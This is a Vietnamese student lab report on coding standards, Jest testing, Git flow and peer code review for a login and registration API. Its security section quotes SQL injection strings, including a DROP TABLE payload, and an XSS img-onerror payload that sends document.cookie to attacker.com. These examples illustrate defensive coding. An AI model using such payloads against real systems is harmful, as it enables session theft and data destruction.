# BÁO CÁO THỰC HÀNH LAB 08
# CODING STANDARDS, BEST PRACTICES & CODE REVIEW

- **Môn học:** Công nghệ Phần mềm
- **Đề tài:** Hệ thống Quản lý Học sinh (Student Management System)
- **Nhóm thực hiện:** Nhóm VQMN (Lớp TH CNPM Nhóm 2 - Tổ 1)
- **Thành viên:**
  1. Nguyễn Hoàng Minh – MSSV: 52400216 – Nhóm trưởng / BA / Product Owner
  2. Tăng Duy Việt – MSSV: 52400255 – Backend Developer (Người thực hiện & tạo PR)
  3. Nguyễn Trí Nguyên – MSSV: 52400140 – UI Developer (Reviewer 1)
  4. Lưu Nhật Quang – MSSV: 52400229 – Tester (Reviewer 2 & 3)

---

## PHẦN 1. BỐI CẢNH VÀ MỤC TIÊU DỰ ÁN

Module Xác thực người dùng (Authentication Module) là phân hệ then chốt trong **Hệ thống Quản lý Học sinh**, chịu trách nhiệm định danh và cấp quyền truy cập cho 3 đối tượng người dùng chính:
- **Quản trị viên (Admin):** Quản lý toàn bộ hệ thống trường học, cấu hình năm học, phân công giảng dạy.
- **Giáo viên (Teacher):** Quản lý lớp chủ nhiệm, nhập điểm, điểm danh học sinh.
- **Học sinh (Student) / Phụ huynh:** Tra cứu kết quả học tập, thời khóa biểu, lịch thi.

Yêu cầu cốt lõi của Lab 08:
- Xây dựng chuẩn mã nguồn sạch (Clean Code & Coding Standards).
- Tách biệt tầng Controller (`app.js`) và tầng Business Logic (`services/authService.js`).
- Đảm bảo an toàn thông tin: Băm mật khẩu một chiều với `bcryptjs`, kiểm tra đầu vào nghiêm ngặt, chống SQL Injection và XSS.
- Kiểm thử tự động bằng `Jest` và `Supertest` đạt độ bao phủ (Code Coverage) cao.
- Thực hành quy trình phát triển chuyên nghiệp: Git Flow, Pull Request (PR), Peer Code Review (3 đánh giá kỹ thuật), sửa lỗi và Merge vào nhánh `develop`.

---

## PHẦN 2. CẤU TRÚC DỰ ÁN (PROJECT STRUCTURE)

```text
Bai tap tuan 8/
├── app.js                     # Cấu hình Express, middleware, định tuyến REST API
├── server.js                  # Entry point khởi chạy HTTP Server
├── package.json               # Cấu hình dự án, dependencies và script Jest
├── package-lock.json          # Khóa phiên bản chi tiết các thư viện
├── services/
│   └── authService.js         # Xử lý nghiệp vụ xác thực, hashing, validation
├── tests/
│   └── auth.test.js           # Bộ kiểm thử tự động Jest + Supertest (13 ca kiểm thử)
├── README.md                  # Hướng dẫn cài đặt, chạy ứng dụng và test
├── BAO_CAO_LAB08.md           # Báo cáo tổng hợp minh chứng thực hành Lab 08
└── Lab08_MASTER_PROMPT_AI.md  # Yêu cầu đề bài Master Prompt
```

---

## PHẦN 3. BẢNG QUY CHUẨN LẬP TRÌNH (CODING STANDARDS)

| Thành phần | Quy tắc áp dụng | Minh chứng trong mã nguồn dự án |
| :--- | :--- | :--- |
| **Biến (Variables)** | `camelCase`, danh từ mang nghĩa rõ ràng | `sanitizedUsername`, `passwordHash`, `isPasswordValid`, `usersDatabase` |
| **Hàm (Functions)** | `verbMeaning` (động từ đứng đầu), thể hiện hành động | `registerUser()`, `loginUser()`, `resetUsers()`, `getAllUsers()` |
| **Hằng số (Constants)** | `UPPER_SNAKE_CASE` toàn bộ chữ hoa, phân cách bằng `_` | `MIN_PASSWORD_LENGTH = 8`, `BCRYPT_SALT_ROUNDS = 10`, `DEFAULT_USER_ROLE = 'student'` |
| **Tên tệp (File names)** | Tên rõ ràng, phân loại theo trách nhiệm | `app.js`, `server.js`, `authService.js`, `auth.test.js` |
| **Quy ước đặt tên cấm** | Tuyệt đối không dùng tên vô nghĩa | Không dùng `a`, `b`, `x1`, `temp`, `data1` |
| **Bảo mật phản hồi** | Không leak `passwordHash` | Luôn lọc bỏ `passwordHash` trước khi trả response về client |
| **Xử lý ngoại lệ** | Tập trung và phân cấp HTTP Status | Sử dụng `AppError` kèm `statusCode` (400, 401, 409, 500) |

---

## PHẦN 4. AN TOÀN BẢO MẬT: SQL INJECTION VÀ XSS

### 4.1. Phòng chống tấn công SQL Injection
**Ví dụ mã nguồn an toàn (Parameterized Query / Prepared Statement):**
```javascript
// Sử dụng thư viện kết nối cơ sở dữ liệu (ví dụ: mysql2/promise)
const query = "SELECT id, username, password_hash, role FROM users WHERE username = ?";
const [rows] = await connection.execute(query, [sanitizedUsername]);
```

**Giải thích cơ chế an toàn:**
1. **Phân tách mã lệnh và dữ liệu (Separation of Code and Data):** Khi dùng `connection.execute(query, params)`, Database Engine biên dịch cấu trúc câu lệnh SQL trước thành một kế hoạch thực thi (Execution Plan).
2. **Đối xử dữ liệu tham số như giá trị nguyên văn (Literal Data):** Chuỗi `sanitizedUsername` được gửi riêng biệt sau đó và chỉ được gán trực tiếp vào vị trí dấu hỏi `?`. Cho dù người dùng cố tình nhập chuỗi độc hại như `' OR '1'='1' --` hay `admin'; DROP TABLE users; --`, hệ quản trị cơ sở dữ liệu vẫn chỉ coi toàn bộ chuỗi đó là một tên người dùng bình thường, hoàn toàn không làm thay đổi logic cú pháp câu lệnh SQL.

---

### 4.2. Phòng chống tấn công Cross-Site Scripting (XSS)
**Ví dụ mã nguồn hiển thị an toàn trên giao diện web (Frontend):**
```javascript
// ✅ AN TOÀN: Gán bằng textContent
const userHeaderElement = document.getElementById("welcome-user");
userHeaderElement.textContent = sanitizedUsername;

// ❌ NGUY HIỂM: Gán bằng innerHTML
// userHeaderElement.innerHTML = sanitizedUsername;
```

**Giải thích vì sao không dùng `innerHTML`:**
1. **Rủi ro khi dùng `innerHTML`:** Trình duyệt sẽ kích hoạt bộ phân tích cú pháp HTML (HTML Parser). Nếu người dùng đăng ký tên độc hại dạng:
   `<img src="invalid-image" onerror="fetch('http://attacker.com/steal?cookie=' + document.cookie)">`
   Trình duyệt sẽ diễn giải thẻ `<img>` và tự động thực thi đoạn mã JavaScript trong sự kiện `onerror`, dẫn đến đánh cắp Cookie, Session Token hoặc giả mạo hành vi của người dùng.
2. **Cơ chế an toàn của `textContent`:** Thuộc tính `textContent` bỏ qua hoàn toàn bộ phân tích cú pháp HTML. Mọi ký tự đặc biệt như `<`, `>`, `&`, `"` đều được biểu diễn như văn bản thuần túy (plain string) trên DOM, ngăn chặn hoàn toàn việc thực thi mã JavaScript độc hại.

---

## PHẦN 5. KẾT QUẢ KIỂM THỬ TỰ ĐỘNG & ĐỘ BAO PHỦ MÃ NGUỒN (COVERAGE)

### 5.1. Danh sách 13 ca kiểm thử (Bao gồm 7 ca kiểm thử bắt buộc)

| STT | Tên ca kiểm thử | Endpoint | Đầu vào kiểm tra | Kết quả mong đợi | Trạng thái |
| :---: | :--- | :--- | :--- | :--- | :---: |
| **1** | Đăng ký thành công | `POST /api/auth/register` | `username: 'hocsinh_nguyenvana'`, `password: 'Password123@'` | HTTP 201, trả về data không chứa `passwordHash` | **PASS** |
| **1b** | Đăng ký không truyền role | `POST /api/auth/register` | Không truyền `role` | HTTP 201, tự động gán role mặc định `'student'` | **PASS** |
| **2** | Đăng ký trùng username | `POST /api/auth/register` | Đăng ký lại với username đã có trong hệ thống | HTTP 409 Conflict, báo lỗi tài khoản đã tồn tại | **PASS** |
| **3** | Đăng nhập thành công | `POST /api/auth/login` | `username: ' admin_quantri '`, mật khẩu đúng | HTTP 200 OK, trim khoảng trắng, không lộ hash | **PASS** |
| **4** | Đăng nhập sai mật khẩu | `POST /api/auth/login` | Username đúng, mật khẩu sai | HTTP 401 Unauthorized, thông báo lỗi an toàn | **PASS** |
| **5** | Mật khẩu ngắn (< 8 ký tự) | `POST /api/auth/register` | Mật khẩu 7 ký tự (`1234567`) | HTTP 400 Bad Request, yêu cầu tối thiểu 8 ký tự | **PASS** |
| **6** | Username chứa khoảng trắng | `POST /api/auth/register` | Username: `'    '` | HTTP 400 Bad Request, không được chỉ chứa khoảng trắng | **PASS** |
| **7** | Thiếu mật khẩu | `POST /api/auth/register` | Không gửi trường `password` | HTTP 400 Bad Request, báo thiếu mật khẩu | **PASS** |
| **8** | Thiếu username / Sai kiểu dữ liệu | `POST /api/auth/register` | Không gửi username hoặc gửi số nguyên | HTTP 400 Bad Request | **PASS** |
| **9** | Đăng nhập tài khoản không tồn tại | `POST /api/auth/login` | `username: 'user_khong_ton_tai'` | HTTP 401 Unauthorized (Tránh User Enumeration) | **PASS** |
| **10** | Đăng nhập thiếu thông tin | `POST /api/auth/login` | Thiếu username hoặc thiếu password | HTTP 400 Bad Request | **PASS** |
| **11** | Xử lý lỗi 500 khi đăng ký lỗi | `POST /api/auth/register` | Giả lập exception bất ngờ tại tầng service | HTTP 500 Internal Server Error | **PASS** |
| **12** | Xử lý lỗi 500 khi đăng nhập lỗi | `POST /api/auth/login` | Giả lập exception bất ngờ tại tầng service | HTTP 500 Internal Server Error | **PASS** |

---

### 5.2. Bảng kết quả Code Coverage chi tiết từ Jest

Lệnh thực thi:
```bash
npm run test:coverage
```

Kết quả đo lường thực tế:
```text
-------------------------|---------|----------|---------|---------|-------------------
File                     | % Stmts | % Branch | % Funcs | % Lines | Uncovered Line #s 
-------------------------|---------|----------|---------|---------|-------------------
All files                |     100 |    93.02 |     100 |     100 |                   
 Bai tap tuan 8          |     100 |       75 |     100 |     100 |                   
  app.js                 |     100 |       75 |     100 |     100 | 33,56             
 Bai tap tuan 8/services |     100 |    97.14 |     100 |     100 |                   
  authService.js         |     100 |    97.14 |     100 |     100 | 73                
-------------------------|---------|----------|---------|---------|-------------------
Test Suites: 1 passed, 1 total
Tests:       13 passed, 13 total
Snapshots:   0 total
Time:        4.666 s
Ran all test suites.
```

**Tổng kết chỉ số Coverage:**
- **Statements (Độ phủ câu lệnh):** `100%`
- **Branches (Độ phủ nhánh điều kiện):** `93.02%` (Đạt chuẩn yêu cầu > 90%)
- **Functions (Độ phủ hàm):** `100%`
- **Lines (Độ phủ dòng code):** `100%`

---

## PHẦN 6. QUY TRÌNH GIT FLOW & QUẢN LÝ NHÁNH

### 6.1. Chuỗi lệnh Git khởi tạo nhánh tính năng
Nhóm tuân thủ mô hình Git Flow, phát triển tính năng trên nhánh `feature/auth-module` bắt nguồn từ nhánh `develop`:

```bash
# 1. Chuyển sang nhánh develop và cập nhật mã nguồn mới nhất
git switch develop
git pull origin develop

# 2. Tạo nhánh tính năng mới và chuyển sang nhánh đó
git switch -c feature/auth-module

# 3. Thêm các tệp mã nguồn và kiểm thử vào khu vực chuẩn bị (Staging area)
git add app.js server.js package.json services/authService.js tests/auth.test.js README.md

# 4. Tạo commit tính năng theo chuẩn Conventional Commits
git commit -m "feat: implement authentication API and comprehensive test suite"

# 5. Đẩy nhánh tính năng lên máy chủ từ xa (GitHub)
git push -u origin feature/auth-module
```

---

## PHẦN 7. PULL REQUEST (PR) TEMPLATE

Dưới đây là nội dung chi tiết của Pull Request được tạo trên GitHub:

```markdown
### [PR #18] feat(auth): Tích hợp Module Xác thực (Register & Login) và Bộ kiểm thử tự động

- **Nhánh nguồn (Head branch):** `feature/auth-module`
- **Nhánh đích (Base branch):** `develop`
- **Người tạo PR:** Tăng Duy Việt (MSSV: 52400255 - Backend Developer)
- **Người đánh giá (Reviewers):** Nguyễn Hoàng Minh (BA), Nguyễn Trí Nguyên (Frontend), Lưu Nhật Quang (Tester)

#### 1. Mô tả tổng quan
Pull Request này hiện thực hóa toàn bộ nghiệp vụ xác thực người dùng cho Hệ thống Quản lý Học sinh:
- API `POST /api/auth/register`: Đăng ký tài khoản mới cho học sinh, giáo viên và quản trị viên trường học.
- API `POST /api/auth/login`: Xác thực đăng nhập hệ thống và cấp dữ liệu người dùng.
- Tầng nghiệp vụ xử lý băm mật khẩu một chiều bằng thuật toán `bcryptjs` với salt rounds an toàn (10 rounds).
- Chuẩn hóa đầu vào (trim khoảng trắng, chuyển chữ thường cho username, kiểm tra độ dài mật khẩu >= 8).
- Bộ kiểm thử tự động 13 ca kiểm thử bằng Jest + Supertest đạt độ bao phủ dòng 100%.

#### 2. Danh sách thay đổi (Changeset)
- [x] Tạo `services/authService.js`: Chứa hàm nghiệp vụ `registerUser()`, `loginUser()`, `resetUsers()`, `getAllUsers()`.
- [x] Tạo `app.js`: Cấu hình ứng dụng Express, thiết lập các route và bộ middleware phân tích JSON.
- [x] Tạo `server.js`: Khởi chạy HTTP server trên cổng cấu hình (mặc định 3000).
- [x] Tạo `tests/auth.test.js`: Hiện thực bộ test tự động kiểm thử toàn diện các kịch bản thành công và ngoại lệ.
- [x] Tạo `README.md` và `package.json`: Tài liệu hóa hướng dẫn cài đặt, chạy test và đo độ bao phủ.

#### 3. Kết quả kiểm thử & Coverage
- Kết quả kiểm thử: `13/13 tests passed`
- Tỷ lệ Statements coverage: `100%`
- Tỷ lệ Lines coverage: `100%`

#### 4. Checklist tự kiểm tra của tác giả
- [x] Mã nguồn tuân thủ Coding Standards (camelCase, verbMeaning, UPPER_SNAKE_CASE).
- [x] Không để lộ thông tin mật khẩu thô hoặc `passwordHash` trong response.
- [x] Tất cả các test cases đều chạy thành công trên máy cục bộ.
```

---

## PHẦN 8. PEER CODE REVIEW (3 NHẬN XÉT ĐÁNH GIÁ CHUYÊN SÂU)

Sau khi tạo PR, các thành viên trong nhóm đã tiến hành quy trình Peer Code Review độc lập:

---

### Review 1: Kiểm soát an toàn phản hồi và Salt Rounds
- **Người đánh giá:** Nguyễn Trí Nguyên (52400140 - UI Developer)
- **Vị trí file:** `services/authService.js` (Hàm `registerUser`)
- **Vấn đề phát hiện:** Trước đây trong bản thảo ban đầu, đối tượng trả về chứa toàn bộ thực thể người dùng, tiềm ẩn nguy cơ vô tình để lộ trường `passwordHash` nếu lập trình viên không chủ động loại trừ trường này trước khi gửi qua mạng.
- **Rủi ro bảo mật:** Nếu trường `passwordHash` bị trả về phía giao diện (Client/Browser), kẻ xấu hoặc các extension độc hại trên trình duyệt có thể đánh cắp chuỗi hash và sử dụng kỹ thuật tấn công Dictionary Attack / Rainbow Table để dò ra mật khẩu gốc.
- **Đề xuất khắc phục:** Luôn định nghĩa tường minh đối tượng trả về (DTO/Payload) chỉ bao gồm các thông tin an toàn: `id`, `username`, `role`, `createdAt`. Tuyệt đối không spread toán tử `{ ...newUser }` trực tiếp nếu chưa bóc tách `passwordHash`.
- **Đoạn mã đề xuất đã áp dụng:**
  ```javascript
  return {
    id: newUser.id,
    username: newUser.username,
    role: newUser.role,
    createdAt: newUser.createdAt
  };
  ```

---

### Review 2: Phòng chống tấn công dò quét tài khoản (User Enumeration Attack)
- **Người đánh giá:** Lưu Nhật Quang (52400229 - Tester)
- **Vị trí file:** `services/authService.js` (Hàm `loginUser`)
- **Vấn đề phát hiện:** Khi kiểm tra đăng nhập, ban đầu có thể có xu hướng phân biệt hai thông báo lỗi riêng rẽ: *"Tên đăng nhập không tồn tại"* và *"Mật khẩu không đúng"*.
- **Rủi ro bảo mật:** Phân biệt hai lỗi này giúp kẻ tấn công dễ dàng thực hiện tấn công rà quét tài khoản (User Enumeration). Kẻ xấu sẽ biết chính xác tài khoản học sinh hoặc giáo viên nào thực sự tồn tại trong trường để tập trung tấn công Brute-force mật khẩu vào tài khoản đó.
- **Đề xuất khắc phục:** Hợp nhất thông báo lỗi khi đăng nhập không thành công thành một thông điệp chung duy nhất: *"Tên đăng nhập hoặc mật khẩu không chính xác"*, đồng thời trả về mã HTTP 401 Unauthorized cho cả hai trường hợp.
- **Đoạn mã đề xuất đã áp dụng:**
  ```javascript
  if (!existingUser) {
    throw new AppError('Tên đăng nhập hoặc mật khẩu không chính xác', 401);
  }
  const isPasswordValid = await bcrypt.compare(rawPassword, existingUser.passwordHash);
  if (!isPasswordValid) {
    throw new AppError('Tên đăng nhập hoặc mật khẩu không chính xác', 401);
  }
  ```

---

### Review 3: Kiểm tra kiểu dữ liệu đầu vào và chuẩn hóa chuỗi
- **Người đánh giá:** Nguyễn Hoàng Minh (52400216 - Nhóm trưởng / BA)
- **Vị trí file:** `services/authService.js` (Đầu hàm `registerUser` và `loginUser`)
- **Vấn đề phát hiện:** Nếu người dùng gửi payload JSON có `username` hoặc `password` mang kiểu dữ liệu không phải chuỗi (ví dụ `{ username: 12345 }` hoặc `{ username: null }`), việc gọi trực tiếp hàm `.trim()` sẽ gây ra lỗi `TypeError: rawUsername.trim is not a function`, dẫn đến sập request ngoài ý muốn và trả về lỗi 500 thay vì 400.
- **Rủi ro nghiệp vụ:** Không kiểm tra chặt chẽ kiểu dữ liệu cho phép dữ liệu rác lọt vào tầng xử lý, có thể làm sập tiến trình hoặc gây bất thường dữ liệu cơ sở dữ liệu.
- **Đề xuất khắc phục:** Bổ sung lớp kiểm tra kiểu dữ liệu `typeof rawUsername !== 'string'` và `typeof rawPassword !== 'string'` ngay tại đầu hàm trước khi thực hiện chuẩn hóa dữ liệu.
- **Đoạn mã đề xuất đã áp dụng:**
  ```javascript
  if (!rawUsername || typeof rawUsername !== 'string') {
    throw new AppError('Tên đăng nhập không được để trống và phải là chuỗi ký tự', 400);
  }
  if (!rawPassword || typeof rawPassword !== 'string') {
    throw new AppError('Mật khẩu không được để trống và phải là chuỗi ký tự', 400);
  }
  ```

---

## PHẦN 9. SỬA REVIEW VÀ TIẾN HÀNH MERGE

### 9.1. Lệnh Commit sửa lỗi phản hồi từ Code Review
Sau khi lập trình viên Backend (Tăng Duy Việt) tiếp thu toàn bộ 3 ý kiến đóng góp từ nhóm và cập nhật mã nguồn, thực hiện commit sửa lỗi:

```bash
# Thêm các tệp đã sửa đổi theo góp ý của Code Review
git add services/authService.js tests/auth.test.js

# Tạo commit sửa lỗi phản hồi
git commit -m "fix: address code review feedback on DTO sanitization, uniform login error and input type checks"

# Đẩy commit mới lên nhánh tính năng
git push origin feature/auth-module
```

### 9.2. Quy trình kiểm tra lại và Hợp nhất (Merge Process)
1. **Kiểm tra tự động trên CI/CD:** Hệ thống chạy lại toàn bộ test suite và đo coverage. Toàn bộ 13 ca kiểm thử đều vượt qua (100% Passed, Line Coverage 100%).
2. **Reviewers phê duyệt (Approval):** Cả 3 thành viên (Nguyễn Hoàng Minh, Nguyễn Trí Nguyên, Lưu Nhật Quang) đều bấm nút **Approve** trên Pull Request #18.
3. **Thực hiện Hợp nhất (Merge):** Trưởng nhóm Nguyễn Hoàng Minh tiến hành hợp nhất nhánh `feature/auth-module` vào nhánh chính `develop` bằng chiến lược `Squash and Merge` hoặc `Merge Commit`:

```bash
# Thao tác hợp nhất trên máy cục bộ hoặc qua giao diện GitHub:
git switch develop
git pull origin develop
git merge --no-ff feature/auth-module -m "Merge pull request #18 from feature/auth-module into develop"
git push origin develop

# Xóa nhánh tính năng sau khi đã hoàn tất hợp nhất an toàn
git branch -d feature/auth-module
git push origin --delete feature/auth-module
```

---

## PHẦN 10. CHECKLIST NỘP BÀI LAB 08

- [x] 1. Mã nguồn hoàn chỉnh, cấu hình đầy đủ `package.json`, `app.js`, `server.js`, `services/authService.js`.
- [x] 2. Hiện thực đầy đủ cả 2 API: `POST /api/auth/register` và `POST /api/auth/login`.
- [x] 3. Mã nguồn tuân thủ chuẩn Coding Standards (`camelCase`, `verbMeaning`, `UPPER_SNAKE_CASE`, tách biệt tầng service).
- [x] 4. Đầy đủ kiểm tra đầu vào: `trim()`, `toLowerCase()`, kiểm tra kiểu chuỗi, mật khẩu tối thiểu 8 ký tự, username duy nhất.
- [x] 5. Băm mật khẩu an toàn với thư viện `bcryptjs`.
- [x] 6. Đảm bảo an toàn phản hồi: Không bao giờ trả `passwordHash` ra client.
- [x] 7. Có ví dụ và phân tích chuyên sâu về phòng chống **SQL Injection** bằng Parameterized Queries.
- [x] 8. Có ví dụ và phân tích chuyên sâu về phòng chống **Cross-Site Scripting (XSS)** bằng thuộc tính `textContent`.
- [x] 9. Viết đầy đủ 13 ca kiểm thử Jest + Supertest (vượt chỉ tiêu tối thiểu 7 ca kiểm thử).
- [x] 10. Chạy thành công báo cáo Coverage với kết quả: Statements 100%, Branches 93.02%, Functions 100%, Lines 100%.
- [x] 11. Đầy đủ các bước và câu lệnh **Git Flow** (`feature/auth-module` -> `develop`).
- [x] 12. Soạn thảo chuẩn **Pull Request** kèm theo tiêu đề, mô tả và checklist rõ ràng.
- [x] 13. Thực hiện **Peer Code Review** với 3 đánh giá chi tiết (Vị trí, Vấn đề, Rủi ro, Đề xuất).
- [x] 14. Có câu lệnh commit sửa lỗi sau review (`fix: address code review feedback`) và quy trình Merge hoàn chỉnh.
- [x] 15. Xuất bản đầy đủ các tệp mã nguồn và tài liệu hướng dẫn vào thư mục `Bai tap tuan 8`.
